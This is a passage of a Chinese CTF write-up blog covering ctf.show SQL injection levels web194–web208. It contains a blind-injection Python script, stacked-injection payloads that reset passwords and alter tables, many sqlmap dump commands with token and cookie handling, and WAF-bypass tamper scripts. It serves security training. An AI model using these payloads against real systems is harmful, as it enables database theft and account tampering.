class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730210312414.png" alt="image-20210730210312414"></p>
<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><blockquote>
<ul>
<li>正则依旧没有被办，只是办了个右连接等，继续上个脚本梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8f2766ad-af45-441e-b247-7a526b3d150f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表payload="admin' and if((select group_concat(table_name) from information_schema.tables where table_schema=database())regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line"><span class="comment">#查字段payload="admin' and if((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flxg')regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if((select group_concat(f1ag) from ctfshow_flxg)regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(flag+j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730210650528.png" alt="image-20210730210650528"></p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">   //拼接sql语句查找指定ID用户</span><br><span class="line"> $sql = "<span class="keyword">select</span> pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username = &#123;$username&#125;;";</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line"> if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username))&#123;</span><br><span class="line">   $ret['msg']='用户名非法';</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>过滤了空格，用反引号来代替，因为提示堆叠注入，我们考虑用update更新密码，因为sql语句中没有单引号包含，无法成功执行，所以得将admin转十六进制进行执行</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">0x61646d696e;<span class="keyword">update</span><span class="string">`ctfshow_user`</span><span class="keyword">set</span><span class="string">`pass`</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><strong>接着用0x61646d696e，123456登陆就行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730211627435.png" alt="image-20210730211627435"></p>
</blockquote>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username))&#123;</span><br><span class="line">  $ret['msg']='用户名非法';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($username)&gt;16)&#123;</span><br><span class="line">  $ret['msg']='用户名不能超过16个字符';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>多限制了用户名的长度，这里注意正则里ban的是se1ect，二不是select，所以select可以继续使用</strong></p>
<ul>
<li><strong>payload</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username:1;<span class="keyword">select</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">password</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730212125349.png" alt="image-20210730212125349"></p>
</blockquote>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br><span class="line">if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username))&#123;</span><br><span class="line">  $ret['msg']='用户名非法';</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($row[0]==$password)&#123;</span><br><span class="line">    $ret['msg']="登陆成功 flag is $flag";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里在195的基础上ban了update和set等，不过这里没有ban掉show，我们可以在username把表全部查询出来，在password里传入表名，相等即可符合判断条件爆出flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username：520;show tables</span><br><span class="line">password：ctfshow_user</span><br></pre></td></tr></table></figure></div>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><blockquote>
<ul>
<li>上题方法依旧可以做，我们换种思路,这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://86f793a3-65c1-4974-8b76-8276d42d488c.challenge.ctf.show:8080/api/"</span></span><br><span class="line">payload = <span class="string">'0x61646d696e;alter table ctfshow_user change column `pass` `gylq` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `gylq` `id` varchar(255);'</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">'username'</span>: payload,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">"0x61646d696e"</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'&#123;&#125;'</span>.format(i)</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.post(url,data2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res2.json()[<span class="string">'msg'</span>]:</span><br><span class="line">        print(res2.json()[<span class="string">'msg'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><blockquote>
<ul>
<li>不变197做法</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730221610705.png" alt="image-20210730221610705"></p>
<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><blockquote>
<p>和上题一样</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730221717415.png" alt="image-20210730221717415"></p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><blockquote>
<ul>
<li><strong>提示referer标头，查了下资料，默认情况不会对referer发起http请求，但是这题不发就得不到数据，所以可以自行设置referer或者直接level 3</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730231149582.png" alt="image-20210730231149582"></p>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" --dbs</span></span><br></pre></td></tr></table></figure></div>

<p><strong>或者 level 3</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --threads&#x3D;10 --batch --level 3 --dbs</span><br></pre></td></tr></table></figure></div>

<p><strong>查表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u "http://920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" -D ctfshow_web --tables</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查字段</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --threads&#x3D;10 --batch --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure></div>

<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://eb8102e6-5c61-4b70-8a29-24de83d6b0b2.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" -D ctfshow_web -T ctfshow_user -C pass --dump --where "</span>pass <span class="keyword">like</span> <span class="string">'%ctfshow%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730232141620.png" alt="image-20210730232141620"></p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><blockquote>
<ul>
<li>就是用–data指定post传参</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://c339fde0-4900-495d-bcf0-7872c3937afa.challenge.ctf.show:<span class="number">8080</span>/api/<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch  --referer="</span>ctf.show<span class="string">" -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote>
<ul>
<li><strong>将method改成put，并且注意更改content-type为text/plain，否则会被提交成表单</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://fa1b6901-9336-417b-9abf-3b0d199ed673.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><blockquote>
<ul>
<li>提示传递cookie，抓包拿</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://74013a20-89e2-4675-a59b-40916d4e4712.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"  -v 5  --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6"</span><br></pre></td></tr></table></figure></div>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote>
<ul>
<li><strong>要api鉴权我们抓包可以发现他是先/api/getToken.php，然后再访问/api/index.php，根据浏览器里面select.js文件代码分析也可以发现</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731085139350.png" alt="image-20210731085139350"></p>
<p>sqlmap中提供以下两个参数保证每次都能访问一次一次getToken.php来获取token</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br><span class="line">--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://a99900ec-4bec-4ef1-b046-2a62a2f8fc22.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://a99900ec-4bec-4ef1-b046-2a62a2f8fc22.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx --where="flagx like 'ctf%'" --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><blockquote>
<ul>
<li>和上题一样做法，就是换了字段名</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://d531f359-f004-4421-b15c-7c0fd7ec6b24.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://d531f359-f004-4421-b15c-7c0fd7ec6b24.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1  -D ctfshow_web -T  ctfshow_flaxc -C flagv --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote>
<ul>
<li>tamper的初体验，看到过滤了空格</li>
</ul>
</blockquote>
<p>遇到这种情况怎么办？sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">举例如下tamper脚本：</span><br><span class="line"></span><br><span class="line">apostrophemask.py 用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号</span><br><span class="line"></span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br><span class="line"></span><br><span class="line">space2hash.py 空格替换为<span class="comment">#号 随机字符串 以及换行符</span></span><br><span class="line"></span><br><span class="line">space2comment.py 用<span class="comment">/**/</span>代替空格</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py MySQL中空格替换为 <span class="comment">#号 以及更多随机字符串 换行符</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py 用base64编码</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssql查询中替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号</span><br><span class="line"></span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py 用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字<span class="keyword">with</span>表示 suitable <span class="keyword">for</span>替代</span><br><span class="line"></span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的<span class="number">26</span> 有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py 双<span class="keyword">url</span>编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py 替换<span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span></span><br><span class="line"></span><br><span class="line">charencode.py Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span>，MySQL <span class="number">4</span>, <span class="number">5.0</span> <span class="keyword">and</span> <span class="number">5.5</span>，<span class="keyword">Oracle</span> <span class="number">10</span>g，PostgreSQL <span class="number">8.3</span>, <span class="number">8.4</span>, <span class="number">9.0</span><span class="keyword">url</span>编码；</span><br><span class="line"></span><br><span class="line">randomcase.py Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span>，MySQL <span class="number">4</span>, <span class="number">5.0</span> <span class="keyword">and</span> <span class="number">5.5</span>，<span class="keyword">Oracle</span> <span class="number">10</span>g，PostgreSQL <span class="number">8.3</span>, <span class="number">8.4</span>, <span class="number">9.0</span>中随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py 用<span class="comment">/**/</span>分割<span class="keyword">sql</span>关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 <span class="keyword">unicode</span> 编码</span><br><span class="line"></span><br><span class="line">securesphere.py 追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py MySQL &gt;= <span class="number">5.1</span><span class="number">.13</span>注释绕过</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; <span class="number">5.1</span>中关键字前加注释</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://a83c7e70-64d2-4dab-9232-8c5080415bd1.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://a83c7e70-64d2-4dab-9232-8c5080415bd1.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=mycomment -D ctfshow_web -T ctfshow_flaxca --dump</span></span><br></pre></td></tr></table></figure></div>

<p>根据原本的space2comment仿写了一个，将注释换成了<code>0x09</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-空格替换制表符0x09"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">space2comment</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                    quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                    doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">// $id = str_replace('<span class="keyword">select</span><span class="string">', '', $id);</span></span><br><span class="line"><span class="string">  function waf($str)&#123;</span></span><br><span class="line"><span class="string">   return preg_match('</span>/ /<span class="string">', $str);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>只过滤了小写的select，sqlmap自己就会跑大写的</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u "http://90811f8e-b2c5-4181-ac8a-2752c4d91c40.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://90811f8e-b2c5-4181-ac8a-2752c4d91c40.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=mycomment -D ctfshow_web -T ctfshow_flaxcac --dump</span></span><br></pre></td></tr></table></figure></div>

